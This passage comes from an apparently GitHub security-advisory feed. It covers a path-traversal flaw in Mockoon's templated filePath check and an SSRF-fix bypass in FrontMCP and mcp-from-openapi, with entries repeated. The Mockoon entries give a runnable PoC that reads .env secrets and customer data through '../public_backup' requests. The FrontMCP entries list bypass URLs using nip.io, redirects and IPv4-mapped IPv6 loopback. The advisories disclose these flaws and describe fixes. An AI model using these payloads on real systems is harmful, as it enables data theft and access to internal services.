<p><code>packages/commons-server/src/libs/server/server.ts</code>, <code>getSafeFilePath</code> (line 2315). The static base is the text before the first <code>{{</code>, resolved to an absolute path; the parsed <code>filePath</code> is then bounded by a string-prefix check:</p>
<pre><code class="language-ts">const staticBaseDir = staticBaseMatch ? resolve(staticBaseMatch[1]) : null;     // 2336
const parsedFilePath = TemplateParser({ ... request ... });                     // request-controlled
const resolvedPath = resolvePath(parsedFilePath);

if (isPathAbsolute) {
  if (!staticBaseDir || !resolvedPath.startsWith(staticBaseDir)) {              // 2355
    throw new Error(`Access to absolute path outside of the original static base directory (${resolvedPath})`);
  }
} else if (!resolvedPath.startsWith(this.options.environmentDirectory)) {       // 2362
  throw new Error(`Access to relative path outside of the environment base directory (${resolvedPath})`);
}
</code></pre>
<p>With <code>"/srv/public/{{queryParam 'name'}}"</code>, <code>staticBaseDir = /srv/public</code>. A request <code>name=../public_backup/.env</code> resolves to <code>/srv/public_backup/.env</code>, and <code>"/srv/public_backup/.env".startsWith("/srv/public")</code> is <code>true</code> → served. Any sibling whose absolute path begins with the string <code>/srv/public</code> is reachable; the relative branch (<code>:2362</code>) is the same against <code>environmentDirectory</code>. A correct check appends <code>sep</code> to the base, or rejects when <code>relative(base, resolvedPath)</code> starts with <code>..</code>.</p>
<p><code>filePath</code> is request-controlled (<code>queryParam</code>/<code>urlParam</code>/header/body via <code>TemplateParser</code>) for every <code>FILE</code> response: HTTP <code>sendFile</code> (<code>:1762</code>), WebSocket (<code>:1145</code>), callbacks (<code>:1586</code>).</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-sh">cat &gt; /tmp/poc.sh &lt;&lt;'POC'
set -e
mkdir -p /work/public /work/public_backup &amp;&amp; cd /work
echo 'public landing page' &gt; public/index.txt
echo 'AWS_SECRET_ACCESS_KEY=redacted' &gt; public_backup/.env
echo 'Michael, michael@example.com, 555-22-7741' &gt; public_backup/customers.csv
cat &gt; env.json &lt;&lt;'JSON'
{"uuid":"00000000-0000-0000-0000-000000000001","lastMigration":33,"name":"f","port":3000,"hostname":"","folders":[],
"routes":[{"uuid":"11111111-0000-0000-0000-000000000001","type":"http","documentation":"","method":"get","endpoint":"download",
"responses":[{"uuid":"22222222-0000-0000-0000-000000000001","body":"","latency":0,"statusCode":200,"label":"","headers":[],
"bodyType":"FILE","filePath":"/work/public/{{queryParam 'name'}}","sendFileAsBody":true,"rules":[],"rulesOperator":"OR",
"disableTemplating":false,"fallbackTo404":false,"default":true,"crudKey":"id","callbacks":[]}],
"responseMode":null,"streamingMode":null,"streamingInterval":0}],
"rootChildren":[{"type":"route","uuid":"11111111-0000-0000-0000-000000000001"}],
"proxyMode":false,"proxyHost":"","proxyRemovePrefix":false,
"tlsOptions":{"enabled":false,"type":"CERT","pfxPath":"","certPath":"","keyPath":"","caPath":"","passphrase":""},
"cors":true,"headers":[],"proxyReqHeaders":[],"proxyResHeaders":[],"data":[]}
JSON
npm i -g @mockoon/cli@9.6.1 &gt;/dev/null 2&gt;&amp;1
mockoon-cli start --data env.json --port 3000 &gt;/tmp/srv.log 2&gt;&amp;1 &amp;
sleep 6
node -e '
const UA={headers:{"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"}};
const g=async(q)=&gt;{const r=await fetch("http://127.0.0.1:3000/download?name="+encodeURIComponent(q),UA);return (await r.text()).trim();};
(async()=&gt;{
 console.log("[*] intended file (public/index.txt)    :",await g("index.txt"));
 console.log("[+] escape -&gt; ../public_backup/.env     :",await g("../public_backup/.env"));
 console.log("[+] escape -&gt; ../public_backup/customers:",await g("../public_backup/customers.csv"));
})();'
POC
docker run --rm -v /tmp/poc.sh:/poc.sh:ro node:20-bookworm-slim bash /poc.sh
</code></pre>
<p>Output:</p>
<pre><code class="language-text">[*] intended file (public/index.txt)    : public landing page
[+] escape -&gt; ../public_backup/.env     : AWS_SECRET_ACCESS_KEY=redacted
[+] escape -&gt; ../public_backup/customers: Michael, michael@example.com, 555-22-7741
</code></pre>
<p><code>../public_backup/.env</code> and <code>../public_backup/customers.csv</code> are served, outside <code>/work/public/</code>, because their absolute paths string-prefix <code>/work/public</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mockoon/mockoon/security/advisories/GHSA-8wqc-v2q8-vff2">https://github.com/mockoon/mockoon/security/advisories/GHSA-8wqc-v2q8-vff2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59149">https://nvd.nist.gov/vuln/detail/CVE-2026-59149</a></li>
<li><a href="https://github.com/mockoon/mockoon/pull/2255">https://github.com/mockoon/mockoon/pull/2255</a></li>
<li><a href="https://github.com/mockoon/mockoon/commit/b42bdfb7f82e83f0e81bea8e6fe41adf5ec82585">https://github.com/mockoon/mockoon/commit/b42bdfb7f82e83f0e81bea8e6fe41adf5ec82585</a></li>
<li><a href="https://github.com/mockoon/mockoon/releases/tag/v9.7.0">https://github.com/mockoon/mockoon/releases/tag/v9.7.0</a></li>
<li><a href="https://mockoon.com/releases/9.7.0">https://mockoon.com/releases/9.7.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8wqc-v2q8-vff2">https://github.com/advisories/GHSA-8wqc-v2q8-vff2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8wqc-v2q8-vff2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-11T22:04:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@mockoon/commons-server] @Mockoon/commons-server: Path traversal in templated `filePath` lets a request escape the served directory (prefix-only base check)]]></title>
        <id>https://github.com/advisories/GHSA-8wqc-v2q8-vff2</id>
        <link href="https://github.com/advisories/GHSA-8wqc-v2q8-vff2"/>
        <updated>2026-09-11T22:04:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A <code>FILE</code> response whose <code>filePath</code> embeds request data (e.g. <code>"/srv/public/{{queryParam 'name'}}"</code>, the documented way to let the client pick a file) is confined by <code>getSafeFilePath</code> with <code>resolvedPath.startsWith(staticBaseDir)</code>. That prefix test has no path-separator boundary, so a <code>../</code>-escaped path whose absolute form string-prefixes the base directory passes. An unauthenticated client reads files from sibling paths outside the served directory.</p>
<h2 id="details">Details</h2>
<p><code>packages/commons-server/src/libs/server/server.ts</code>, <code>getSafeFilePath</code> (line 2315). The static base is the text before the first <code>{{</code>, resolved to an absolute path; the parsed <code>filePath</code> is then bounded by a string-prefix check:</p>
<pre><code class="language-ts">const staticBaseDir = staticBaseMatch ? resolve(staticBaseMatch[1]) : null;     // 2336
const parsedFilePath = TemplateParser({ ... request ... });                     // request-controlled
const resolvedPath = resolvePath(parsedFilePath);

if (isPathAbsolute) {
  if (!staticBaseDir || !resolvedPath.startsWith(staticBaseDir)) {              // 2355
    throw new Error(`Access to absolute path outside of the original static base directory (${resolvedPath})`);
  }
} else if (!resolvedPath.startsWith(this.options.environmentDirectory)) {       // 2362
  throw new Error(`Access to relative path outside of the environment base directory (${resolvedPath})`);
}
</code></pre>
<p>With <code>"/srv/public/{{queryParam 'name'}}"</code>, <code>staticBaseDir = /srv/public</code>. A request <code>name=../public_backup/.env</code> resolves to <code>/srv/public_backup/.env</code>, and <code>"/srv/public_backup/.env".startsWith("/srv/public")</code> is <code>true</code> → served. Any sibling whose absolute path begins with the string <code>/srv/public</code> is reachable; the relative branch (<code>:2362</code>) is the same against <code>environmentDirectory</code>. A correct check appends <code>sep</code> to the base, or rejects when <code>relative(base, resolvedPath)</code> starts with <code>..</code>.</p>
<p><code>filePath</code> is request-controlled (<code>queryParam</code>/<code>urlParam</code>/header/body via <code>TemplateParser</code>) for every <code>FILE</code> response: HTTP <code>sendFile</code> (<code>:1762</code>), WebSocket (<code>:1145</code>), callbacks (<code>:1586</code>).</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-sh">cat &gt; /tmp/poc.sh &lt;&lt;'POC'
set -e
mkdir -p /work/public /work/public_backup &amp;&amp; cd /work
echo 'public landing page' &gt; public/index.txt
echo 'AWS_SECRET_ACCESS_KEY=redacted' &gt; public_backup/.env
echo 'Michael, michael@example.com, 555-22-7741' &gt; public_backup/customers.csv
cat &gt; env.json &lt;&lt;'JSON'
{"uuid":"00000000-0000-0000-0000-000000000001","lastMigration":33,"name":"f","port":3000,"hostname":"","folders":[],
"routes":[{"uuid":"11111111-0000-0000-0000-000000000001","type":"http","documentation":"","method":"get","endpoint":"download",
"responses":[{"uuid":"22222222-0000-0000-0000-000000000001","body":"","latency":0,"statusCode":200,"label":"","headers":[],
"bodyType":"FILE","filePath":"/work/public/{{queryParam 'name'}}","sendFileAsBody":true,"rules":[],"rulesOperator":"OR",
"disableTemplating":false,"fallbackTo404":false,"default":true,"crudKey":"id","callbacks":[]}],
"responseMode":null,"streamingMode":null,"streamingInterval":0}],
"rootChildren":[{"type":"route","uuid":"11111111-0000-0000-0000-000000000001"}],
"proxyMode":false,"proxyHost":"","proxyRemovePrefix":false,
"tlsOptions":{"enabled":false,"type":"CERT","pfxPath":"","certPath":"","keyPath":"","caPath":"","passphrase":""},
"cors":true,"headers":[],"proxyReqHeaders":[],"proxyResHeaders":[],"data":[]}
JSON
npm i -g @mockoon/cli@9.6.1 &gt;/dev/null 2&gt;&amp;1
mockoon-cli start --data env.json --port 3000 &gt;/tmp/srv.log 2&gt;&amp;1 &amp;
sleep 6
node -e '
const UA={headers:{"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"}};
const g=async(q)=&gt;{const r=await fetch("http://127.0.0.1:3000/download?name="+encodeURIComponent(q),UA);return (await r.text()).trim();};
(async()=&gt;{
 console.log("[*] intended file (public/index.txt)    :",await g("index.txt"));
 console.log("[+] escape -&gt; ../public_backup/.env     :",await g("../public_backup/.env"));
 console.log("[+] escape -&gt; ../public_backup/customers:",await g("../public_backup/customers.csv"));
})();'
POC
docker run --rm -v /tmp/poc.sh:/poc.sh:ro node:20-bookworm-slim bash /poc.sh
</code></pre>
<p>Output:</p>
<pre><code class="language-text">[*] intended file (public/index.txt)    : public landing page
[+] escape -&gt; ../public_backup/.env     : AWS_SECRET_ACCESS_KEY=redacted
[+] escape -&gt; ../public_backup/customers: Michael, michael@example.com, 555-22-7741
</code></pre>
<p><code>../public_backup/.env</code> and <code>../public_backup/customers.csv</code> are served, outside <code>/work/public/</code>, because their absolute paths string-prefix <code>/work/public</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mockoon/mockoon/security/advisories/GHSA-8wqc-v2q8-vff2">https://github.com/mockoon/mockoon/security/advisories/GHSA-8wqc-v2q8-vff2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59149">https://nvd.nist.gov/vuln/detail/CVE-2026-59149</a></li>
<li><a href="https://github.com/mockoon/mockoon/pull/2255">https://github.com/mockoon/mockoon/pull/2255</a></li>
<li><a href="https://github.com/mockoon/mockoon/commit/b42bdfb7f82e83f0e81bea8e6fe41adf5ec82585">https://github.com/mockoon/mockoon/commit/b42bdfb7f82e83f0e81bea8e6fe41adf5ec82585</a></li>
<li><a href="https://github.com/mockoon/mockoon/releases/tag/v9.7.0">https://github.com/mockoon/mockoon/releases/tag/v9.7.0</a></li>
<li><a href="https://mockoon.com/releases/9.7.0">https://mockoon.com/releases/9.7.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8wqc-v2q8-vff2">https://github.com/advisories/GHSA-8wqc-v2q8-vff2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8wqc-v2q8-vff2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-11T22:04:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[frontmcp] FrontMCP and mcp-from-openapi have bypass of OpenAPI external $ref SSRF fix]]></title>
        <id>https://github.com/advisories/GHSA-65h7-9wrw-629c</id>
        <link href="https://github.com/advisories/GHSA-65h7-9wrw-629c"/>
        <updated>2026-09-11T22:02:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The published fix for GHSA-v6ph-xcq9-qxxj / CVE-2026-39885 added a direct hostname denylist for OpenAPI external <code>$ref</code> dereferencing, but the latest patched dependency <code>mcp-from-openapi</code> 2.3.0 still makes backend-origin requests to loopback when the target is reached through hostname resolution, redirects, or IPv4-mapped IPv6 syntax.</p>
<p>FrontMCP latest release v1.2.1 and current main still call <code>OpenAPIToolGenerator.fromURL()</code> and <code>OpenAPIToolGenerator.fromJSON()</code> from <code>mcp-from-openapi</code> 2.3.0 when loading OpenAPI adapters. An attacker who can cause a hosted or multi-user FrontMCP deployment to load an untrusted OpenAPI spec can trigger requests from the server to localhost or private services during tool generation.</p>
<p>This is a latest-version bypass of the previous fix. A direct <code>http://127.0.0.1</code> <code>$ref</code> control is now denied and produces zero canary hits, while semantically equivalent loopback targets still reach the canary.</p>
<h2 id="latest-versions-checked">Latest versions checked</h2>
<ul>
<li><code>frontmcp</code> npm latest: 1.2.1</li>
<li><code>@frontmcp/adapters</code> npm latest: 1.2.1</li>
<li><code>mcp-from-openapi</code> npm latest: 2.3.0</li>
<li>FrontMCP release tag: v1.2.1, commit db323976c66297d684a3e63bbfe1db6b310f2944</li>
<li>FrontMCP current main checked: c15b79abe8c6a3cb71d4b7a3bafb8190730dc756</li>
</ul>
<p>The release tag and current main both keep <code>mcp-from-openapi</code> 2.3.0 in <code>package.json</code> and <code>libs/adapters/package.json</code>, and both keep the OpenAPI adapter forwarding untrusted <code>url</code>, <code>spec</code>, and <code>loadOptions.refResolution</code> into <code>OpenAPIToolGenerator</code>.</p>
<h2 id="technical-details">Technical details</h2>
<p>FrontMCP's OpenAPI adapter reaches the affected dependency paths:</p>
<ul>
<li><code>libs/adapters/src/openapi/openapi.adapter.ts</code> imports <code>OpenAPIToolGenerator</code> from <code>mcp-from-openapi</code>.</li>
<li><code>loadOpenAPISpec()</code> calls <code>OpenAPIToolGenerator.fromURL(this.options.url, ...)</code> and forwards <code>loadOptions.refResolution</code>.</li>
<li>The same method calls <code>OpenAPIToolGenerator.fromJSON(this.options.spec, ...)</code> and forwards <code>loadOptions.refResolution</code>.</li>
</ul>
<p>In <code>mcp-from-openapi</code> 2.3.0, the patched guard is applied before the HTTP resolver fetches an external <code>$ref</code>. It checks the parsed URL hostname string against deny patterns for direct local and private addresses. The resolver does not resolve hostnames before allow or deny decisions, does not pin the validated IP to the fetch, and does not revalidate redirect targets before following them. It also misses IPv4-mapped IPv6 loopback forms.</p>
<p>As a result, these URLs are accepted by the guard but cause a loopback request from the backend:</p>
<ul>
<li><code>http://127.0.0.1.nip.io:&lt;port&gt;/schema.json</code>, because the hostname string is not a direct IP even though it resolves to 127.0.0.1.</li>
<li><code>http://127.0.0.1.nip.io:&lt;port&gt;/redirect</code>, because the first host passes and the actual request follows a redirect to <code>http://127.0.0.1:&lt;port&gt;/schema.json</code>.</li>
<li><code>http://[::ffff:127.0.0.1]:&lt;port&gt;/schema.json</code> and <code>http://[::ffff:7f00:1]:&lt;port&gt;/schema.json</code>, because IPv4-mapped IPv6 loopback is not normalized and denied.</li>
</ul>
<p><code>OpenAPIToolGenerator.fromURL()</code> is also still unguarded for the initial OpenAPI spec URL. The PoC includes that as supporting evidence, but the primary report is the external <code>$ref</code> fix bypass.</p>
<h2 id="reproduction">Reproduction</h2>
<p>The attached local PoC starts a loopback canary and loads generated OpenAPI specs using <code>mcp-from-openapi</code> 2.3.0. The request body schema contains a single external <code>$ref</code> for each test case. The canary records every backend-origin request.</p>
<p>Run:</p>
<pre><code class="language-bash">cd /home/unkn0wn/security_audit/frontmcp-ssrf-poc
node repro-frontmcp-latest-ssrf-bypasses.mjs
</code></pre>
<p>Important output from a fresh run on 2026-05-25:</p>
<pre><code class="language-json">{"name":"direct-127-denied-control","kind":"external_ref","refUrl":"http://127.0.0.1:45117/schema.json","ok":false,"hitCount":0,"hits":[]}
{"name":"dns-name-to-127-bypass","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"127.0.0.1.nip.io:45117","authorization":null}]}
{"name":"dns-name-to-127-bypass-with-allowedHosts","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"127.0.0.1.nip.io:45117","authorization":null}]}
{"name":"redirect-to-127-after-allowed-host","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/redirect","ok":true,"hitCount":2,"hits":[{"url":"/redirect","host":"127.0.0.1.nip.io:45117","authorization":null},{"url":"/schema.json","host":"127.0.0.1:45117","authorization":null}]}
{"name":"ipv4-mapped-ipv6-dotted-bypass","kind":"external_ref","refUrl":"http://[::ffff:127.0.0.1]:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"[::ffff:7f00:1]:45117","authorization":null}]}
{"name":"ipv4-mapped-ipv6-hex-bypass","kind":"external_ref","refUrl":"http://[::ffff:7f00:1]:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"[::ffff:7f00:1]:45117","authorization":null}]}
{"name":"external-refs-disabled-control","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/schema.json","ok":true,"hitCount":0,"hits":[]}
</code></pre>
<p>Controls:</p>
<ol>
<li>Direct loopback <code>$ref</code> is denied and the canary records zero requests.</li>
<li>Numeric IPv4 variants tested as parser controls were denied with zero requests.</li>
<li>Default <code>file://</code> resolution was denied in this runtime.</li>
<li>Setting <code>refResolution.allowedProtocols: []</code> prevents the external request, but this is not the default.</li>
</ol>
<h2 id="impact">Impact</h2>
<p>The previous advisory documented SSRF during untrusted OpenAPI <code>$ref</code> dereferencing. The latest patched version still lets an attacker trigger backend-origin requests to loopback or private network services through equivalent URL forms. In hosted or multi-user FrontMCP deployments where users can import or configure OpenAPI specs, this can expose internal admin APIs, metadata-like services, and other network endpoints that external users cannot reach directly.</p>
<p>The impact depends on whether a deployment treats OpenAPI adapter configuration as trusted administrator-only input. If untrusted authenticated users can import specs, this is a high-impact SSRF fix bypass. If only a local administrator can configure OpenAPI specs, the practical severity is lower.</p>
<h2 id="remediation">Remediation</h2>
<ol>
<li>Do not rely on parsed hostname denylist checks for external <code>$ref</code> URLs.</li>
<li>Resolve hostnames before the request and reject loopback, private, link-local, multicast, unspecified, and metadata ranges.</li>
<li>Normalize IPv4-mapped IPv6 before range checks.</li>
<li>Revalidate every redirect target before following it, or disable redirects during external <code>$ref</code> dereferencing.</li>
<li>Pin the validated IP to the actual request with a custom dispatcher, lookup hook, or equivalent connect-time control.</li>
<li>Apply the same protected client to <code>fromURL()</code> initial spec loads.</li>
<li>Consider disabling external refs by default for untrusted OpenAPI specs and requiring explicit allowlists.</li>
<li>Add regression tests for direct loopback, DNS-to-loopback, redirect-to-loopback, IPv4-mapped IPv6, numeric IP forms, file refs, and disabled external refs.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/agentfront/frontmcp/security/advisories/GHSA-65h7-9wrw-629c">https://github.com/agentfront/frontmcp/security/advisories/GHSA-65h7-9wrw-629c</a></li>
<li><a href="https://github.com/advisories/GHSA-65h7-9wrw-629c">https://github.com/advisories/GHSA-65h7-9wrw-629c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-65h7-9wrw-629c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-11T22:02:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@frontmcp/adapters] FrontMCP and mcp-from-openapi have bypass of OpenAPI external $ref SSRF fix]]></title>
        <id>https://github.com/advisories/GHSA-65h7-9wrw-629c</id>
        <link href="https://github.com/advisories/GHSA-65h7-9wrw-629c"/>
        <updated>2026-09-11T22:02:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The published fix for GHSA-v6ph-xcq9-qxxj / CVE-2026-39885 added a direct hostname denylist for OpenAPI external <code>$ref</code> dereferencing, but the latest patched dependency <code>mcp-from-openapi</code> 2.3.0 still makes backend-origin requests to loopback when the target is reached through hostname resolution, redirects, or IPv4-mapped IPv6 syntax.</p>
<p>FrontMCP latest release v1.2.1 and current main still call <code>OpenAPIToolGenerator.fromURL()</code> and <code>OpenAPIToolGenerator.fromJSON()</code> from <code>mcp-from-openapi</code> 2.3.0 when loading OpenAPI adapters. An attacker who can cause a hosted or multi-user FrontMCP deployment to load an untrusted OpenAPI spec can trigger requests from the server to localhost or private services during tool generation.</p>
<p>This is a latest-version bypass of the previous fix. A direct <code>http://127.0.0.1</code> <code>$ref</code> control is now denied and produces zero canary hits, while semantically equivalent loopback targets still reach the canary.</p>
<h2 id="latest-versions-checked">Latest versions checked</h2>
<ul>
<li><code>frontmcp</code> npm latest: 1.2.1</li>
<li><code>@frontmcp/adapters</code> npm latest: 1.2.1</li>
<li><code>mcp-from-openapi</code> npm latest: 2.3.0</li>
<li>FrontMCP release tag: v1.2.1, commit db323976c66297d684a3e63bbfe1db6b310f2944</li>
<li>FrontMCP current main checked: c15b79abe8c6a3cb71d4b7a3bafb8190730dc756</li>
</ul>
<p>The release tag and current main both keep <code>mcp-from-openapi</code> 2.3.0 in <code>package.json</code> and <code>libs/adapters/package.json</code>, and both keep the OpenAPI adapter forwarding untrusted <code>url</code>, <code>spec</code>, and <code>loadOptions.refResolution</code> into <code>OpenAPIToolGenerator</code>.</p>
<h2 id="technical-details">Technical details</h2>
<p>FrontMCP's OpenAPI adapter reaches the affected dependency paths:</p>
<ul>
<li><code>libs/adapters/src/openapi/openapi.adapter.ts</code> imports <code>OpenAPIToolGenerator</code> from <code>mcp-from-openapi</code>.</li>
<li><code>loadOpenAPISpec()</code> calls <code>OpenAPIToolGenerator.fromURL(this.options.url, ...)</code> and forwards <code>loadOptions.refResolution</code>.</li>
<li>The same method calls <code>OpenAPIToolGenerator.fromJSON(this.options.spec, ...)</code> and forwards <code>loadOptions.refResolution</code>.</li>
</ul>
<p>In <code>mcp-from-openapi</code> 2.3.0, the patched guard is applied before the HTTP resolver fetches an external <code>$ref</code>. It checks the parsed URL hostname string against deny patterns for direct local and private addresses. The resolver does not resolve hostnames before allow or deny decisions, does not pin the validated IP to the fetch, and does not revalidate redirect targets before following them. It also misses IPv4-mapped IPv6 loopback forms.</p>
<p>As a result, these URLs are accepted by the guard but cause a loopback request from the backend:</p>
<ul>
<li><code>http://127.0.0.1.nip.io:&lt;port&gt;/schema.json</code>, because the hostname string is not a direct IP even though it resolves to 127.0.0.1.</li>
<li><code>http://127.0.0.1.nip.io:&lt;port&gt;/redirect</code>, because the first host passes and the actual request follows a redirect to <code>http://127.0.0.1:&lt;port&gt;/schema.json</code>.</li>
<li><code>http://[::ffff:127.0.0.1]:&lt;port&gt;/schema.json</code> and <code>http://[::ffff:7f00:1]:&lt;port&gt;/schema.json</code>, because IPv4-mapped IPv6 loopback is not normalized and denied.</li>
</ul>
<p><code>OpenAPIToolGenerator.fromURL()</code> is also still unguarded for the initial OpenAPI spec URL. The PoC includes that as supporting evidence, but the primary report is the external <code>$ref</code> fix bypass.</p>
<h2 id="reproduction">Reproduction</h2>
<p>The attached local PoC starts a loopback canary and loads generated OpenAPI specs using <code>mcp-from-openapi</code> 2.3.0. The request body schema contains a single external <code>$ref</code> for each test case. The canary records every backend-origin request.</p>
<p>Run:</p>
<pre><code class="language-bash">cd /home/unkn0wn/security_audit/frontmcp-ssrf-poc
node repro-frontmcp-latest-ssrf-bypasses.mjs
</code></pre>
<p>Important output from a fresh run on 2026-05-25:</p>
<pre><code class="language-json">{"name":"direct-127-denied-control","kind":"external_ref","refUrl":"http://127.0.0.1:45117/schema.json","ok":false,"hitCount":0,"hits":[]}
{"name":"dns-name-to-127-bypass","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"127.0.0.1.nip.io:45117","authorization":null}]}
{"name":"dns-name-to-127-bypass-with-allowedHosts","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"127.0.0.1.nip.io:45117","authorization":null}]}
{"name":"redirect-to-127-after-allowed-host","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/redirect","ok":true,"hitCount":2,"hits":[{"url":"/redirect","host":"127.0.0.1.nip.io:45117","authorization":null},{"url":"/schema.json","host":"127.0.0.1:45117","authorization":null}]}
{"name":"ipv4-mapped-ipv6-dotted-bypass","kind":"external_ref","refUrl":"http://[::ffff:127.0.0.1]:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"[::ffff:7f00:1]:45117","authorization":null}]}
{"name":"ipv4-mapped-ipv6-hex-bypass","kind":"external_ref","refUrl":"http://[::ffff:7f00:1]:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"[::ffff:7f00:1]:45117","authorization":null}]}
{"name":"external-refs-disabled-control","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/schema.json","ok":true,"hitCount":0,"hits":[]}
</code></pre>
<p>Controls:</p>
<ol>
<li>Direct loopback <code>$ref</code> is denied and the canary records zero requests.</li>
<li>Numeric IPv4 variants tested as parser controls were denied with zero requests.</li>
<li>Default <code>file://</code> resolution was denied in this runtime.</li>
<li>Setting <code>refResolution.allowedProtocols: []</code> prevents the external request, but this is not the default.</li>
</ol>
<h2 id="impact">Impact</h2>
<p>The previous advisory documented SSRF during untrusted OpenAPI <code>$ref</code> dereferencing. The latest patched version still lets an attacker trigger backend-origin requests to loopback or private network services through equivalent URL forms. In hosted or multi-user FrontMCP deployments where users can import or configure OpenAPI specs, this can expose internal admin APIs, metadata-like services, and other network endpoints that external users cannot reach directly.</p>
<p>The impact depends on whether a deployment treats OpenAPI adapter configuration as trusted administrator-only input. If untrusted authenticated users can import specs, this is a high-impact SSRF fix bypass. If only a local administrator can configure OpenAPI specs, the practical severity is lower.</p>
<h2 id="remediation">Remediation</h2>
<ol>
<li>Do not rely on parsed hostname denylist checks for external <code>$ref</code> URLs.</li>
<li>Resolve hostnames before the request and reject loopback, private, link-local, multicast, unspecified, and metadata ranges.</li>
<li>Normalize IPv4-mapped IPv6 before range checks.</li>
<li>Revalidate every redirect target before following it, or disable redirects during external <code>$ref</code> dereferencing.</li>
<li>Pin the validated IP to the actual request with a custom dispatcher, lookup hook, or equivalent connect-time control.</li>
<li>Apply the same protected client to <code>fromURL()</code> initial spec loads.</li>
<li>Consider disabling external refs by default for untrusted OpenAPI specs and requiring explicit allowlists.</li>
<li>Add regression tests for direct loopback, DNS-to-loopback, redirect-to-loopback, IPv4-mapped IPv6, numeric IP forms, file refs, and disabled external refs.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/agentfront/frontmcp/security/advisories/GHSA-65h7-9wrw-629c">https://github.com/agentfront/frontmcp/security/advisories/GHSA-65h7-9wrw-629c</a></li>
<li><a href="https://github.com/advisories/GHSA-65h7-9wrw-629c">https://github.com/advisories/GHSA-65h7-9wrw-629c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-65h7-9wrw-629c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-11T22:02:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-from-openapi] FrontMCP and mcp-from-openapi have bypass of OpenAPI external $ref SSRF fix]]></title>
        <id>https://github.com/advisories/GHSA-65h7-9wrw-629c</id>
        <link href="https://github.com/advisories/GHSA-65h7-9wrw-629c"/>
        <updated>2026-09-11T22:02:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The published fix for GHSA-v6ph-xcq9-qxxj / CVE-2026-39885 added a direct hostname denylist for OpenAPI external <code>$ref</code> dereferencing, but the latest patched dependency <code>mcp-from-openapi</code> 2.3.0 still makes backend-origin requests to loopback when the target is reached through hostname resolution, redirects, or IPv4-mapped IPv6 syntax.</p>
<p>FrontMCP latest release v1.2.1 and current main still call <code>OpenAPIToolGenerator.fromURL()</code> and <code>OpenAPIToolGenerator.fromJSON()</code> from <code>mcp-from-openapi</code> 2.3.0 when loading OpenAPI adapters. An attacker who can cause a hosted or multi-user FrontMCP deployment to load an untrusted OpenAPI spec can trigger requests from the server to localhost or private services during tool generation.</p>
<p>This is a latest-version bypass of the previous fix. A direct <code>http://127.0.0.1</code> <code>$ref</code> control is now denied and produces zero canary hits, while semantically equivalent loopback targets still reach the canary.</p>
<h2 id="latest-versions-checked">Latest versions checked</h2>
<ul>
<li><code>frontmcp</code> npm latest: 1.2.1</li>
<li><code>@frontmcp/adapters</code> npm latest: 1.2.1</li>
<li><code>mcp-from-openapi</code> npm latest: 2.3.0</li>
<li>FrontMCP release tag: v1.2.1, commit db323976c66297d684a3e63bbfe1db6b310f2944</li>
<li>FrontMCP current main checked: c15b79abe8c6a3cb71d4b7a3bafb8190730dc756</li>
</ul>
<p>The release tag and current main both keep <code>mcp-from-openapi</code> 2.3.0 in <code>package.json</code> and <code>libs/adapters/package.json</code>, and both keep the OpenAPI adapter forwarding untrusted <code>url</code>, <code>spec</code>, and <code>loadOptions.refResolution</code> into <code>OpenAPIToolGenerator</code>.</p>
<h2 id="technical-details">Technical details</h2>
